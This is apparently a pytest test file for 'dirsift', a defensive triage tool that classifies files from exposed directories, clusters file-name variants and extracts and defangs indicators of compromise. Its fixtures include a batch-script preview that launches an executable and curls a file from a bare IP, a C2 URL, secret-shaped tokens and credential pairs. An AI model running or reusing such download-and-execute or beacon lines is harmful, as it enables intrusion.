"""Classification, clustering, glue scoring and indicator extraction."""

from __future__ import annotations

from dirsift.classify import Confidence, Kind, classify, mismatch, sniff
from dirsift.cluster import find_clusters
from dirsift.extract import defang, defang_text, extract_iocs, refang
from dirsift.glue import score_glue
from dirsift.models import Entry


def entry(name: str, **kw) -> Entry:
    return Entry(url=f"http://example.test/files/{name}", name=name, **kw)


# -- classify --------------------------------------------------------------


def test_magic_beats_extension():
    e = classify(entry("invoice.pdf"), b"MZ\x90\x00\x03")
    assert e.kind is Kind.PE
    assert e.confidence is Confidence.SNIFFED
    assert mismatch(e) is not None


def test_extension_refines_a_weak_text_sniff():
    """Plain text only proves "not binary"; .bat carries the real information."""
    e = classify(entry("run.bat"), b"@echo off\r\nstart x.exe\r\n")
    assert e.kind is Kind.SCRIPT
    assert mismatch(e) is None


def test_extension_only_when_nothing_was_read():
    e = classify(entry("payload.dll"))
    assert e.kind is Kind.PE
    assert e.confidence is Confidence.EXTENSION


def test_zip_container_is_refined_by_extension():
    assert classify(entry("report.docx"), b"PK\x03\x04").kind is Kind.DOCUMENT
    assert classify(entry("stage.zip"), b"PK\x03\x04").kind is Kind.ARCHIVE


def test_benign_text_shuffles_are_not_reported_as_mismatches():
    e = classify(entry("data.txt"), b'{"a": 1}')
    assert mismatch(e) is None


def test_sniff_reads_tar_magic_at_offset():
    assert sniff(b"\x00" * 257 + b"ustar")[0] is Kind.ARCHIVE


# -- cluster ---------------------------------------------------------------


def test_numeric_family_keeps_the_gap_visible():
    names = ["secrun2.exe", "secrun3.exe", "secrun4.exe", "secrun6.exe"]
    cluster = find_clusters([entry(n) for n in names])[0]
    assert cluster.label == "secrun{n}.exe"
    assert cluster.variants == ["2..4", "6"]


def test_dates_are_not_mistaken_for_hex():
    names = [f"dump_2026091{i}.txt" for i in (1, 2, 3)]
    cluster = find_clusters([entry(n) for n in names])[0]
    assert cluster.variant_kind == "date"


def test_hex_family():
    names = ["payload_a3f29c.bin", "payload_ff0012.bin"]
    cluster = find_clusters([entry(n) for n in names])[0]
    assert cluster.variant_kind == "hex"


def test_only_the_varying_token_is_reported():
    names = ["build_v1.2.3.zip", "build_v1.2.9.zip"]
    cluster = find_clusters([entry(n) for n in names])[0]
    assert cluster.variants == ["3", "9"]


def test_single_letter_family_needs_three_members():
    assert find_clusters([entry("runa.exe"), entry("runb.exe")]) == []
    assert len(find_clusters([entry(n) for n in ("runa.exe", "runb.exe", "runc.exe")])) == 1


def test_unrelated_names_do_not_cluster():
    assert find_clusters([entry("readme.txt"), entry("config.json")]) == []


# -- glue ------------------------------------------------------------------


def test_the_driver_script_outranks_everything_else():
    files = [
        entry(
            "run.bat",
            kind=Kind.SCRIPT,
            depth=1,
            text_preview='@echo off\nstart "" secrun6.exe\ncurl -s http://1.2.3.4/g -o a\n',
        ),
        entry("secrun6.exe", kind=Kind.PE, depth=1),
        entry("notes.txt", kind=Kind.DATA, depth=1, text_preview="nothing to see"),
    ]
    ranked = score_glue(files)
    assert ranked[0].entry.name == "run.bat"
    assert "secrun6.exe" in ranked[0].references
    assert "curl" in ranked[0].tells


def test_a_file_does_not_reference_itself():
    files = [entry("run.bat", kind=Kind.SCRIPT, text_preview="run.bat calls run.bat")]
    assert score_glue(files)[0].references == []


def test_binaries_are_never_glue_candidates():
    files = [entry("loader.exe", kind=Kind.PE), entry("other.exe", kind=Kind.PE)]
    assert score_glue(files) == []


# -- extract ---------------------------------------------------------------


def test_defanged_and_live_forms_dedupe_to_one_indicator():
    text = "primary http://1.2.3.4/g\nbackup hxxp://1[.]2[.]3[.]4/g\n"
    urls = [i for i in extract_iocs(text, "u") if i.ioc_type == "url"]
    assert len(urls) == 1


def test_refang_and_defang_round_trip():
    assert refang("hxxp://cdn[.]example[.]org") == "http://cdn.example.org"
    assert defang("http://1.2.3.4/x") == "hxxp://1[.]2[.]3[.]4/x"


def test_loopback_and_unspecified_addresses_are_dropped():
    found = {i.value for i in extract_iocs("127.0.0.1 0.0.0.0 185.234.219.44", "u")}
    assert found == {"185.234.219.44"}


def test_port_is_kept_with_the_address():
    values = {i.value for i in extract_iocs("beacon to 185.234.219.44:8081", "u")}
    assert "185.234.219.44:8081" in values


def test_named_secret_shapes():
    text = (
        'bot = "7823461155:AAH9kLmQwErTyUiOpAsDfGhJkLzXcVbNm12"\n'
        'aws = "AKIAIOSFODNN7EXAMPLE"\n'
    )
    labels = {i.label for i in extract_iocs(text, "u") if i.ioc_type == "secret"}
    assert {"telegram_bot_token", "aws_access_key"} <= labels


def test_credential_dump_lines():
    labels = [
        i.label for i in extract_iocs("admin:P@ssw0rd123\noperator:letmein\n", "u")
    ]
    assert labels.count("credential_pair") == 2


def test_placeholder_secrets_are_ignored():
    assert extract_iocs('password = "changeme"\napi_key = "your_api_key"\n', "u") == []


def test_paths_are_not_defanged():
    ioc = next(i for i in extract_iocs(r"copy %TEMP%\p.dat", "u") if i.ioc_type == "path")
    assert ioc.defanged == ioc.value == r"%TEMP%\p.dat"


def test_context_travels_defanged():
    ioc = next(i for i in extract_iocs('"c2": "http://185.234.219.44/g"', "u"))
    assert "http://185.234.219.44" not in ioc.context
    assert "185[.]234[.]219[.]44" in ioc.context


def test_defang_text_leaves_prose_alone():
    assert defang_text("nothing here") == "nothing here"
